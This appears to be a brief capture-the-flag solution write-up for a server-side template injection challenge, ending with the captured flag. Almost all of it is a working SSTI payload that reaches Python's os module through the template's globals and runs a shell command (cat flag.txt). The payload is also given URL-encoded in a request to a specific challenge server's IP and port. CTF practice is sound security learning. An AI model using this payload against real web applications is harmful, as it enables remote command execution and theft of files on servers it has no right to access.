## Solve:

- [ ] Reference to SSTI (Server Side Template Injection)
  ```python
  {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
  ```
  
  http://206.189.59.199:8005/?c={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/flag.txt%27).read()}}

<br/>

## Flag:
`flag{Server_Side_Template_Injection_is_4_cool_kids_only}`
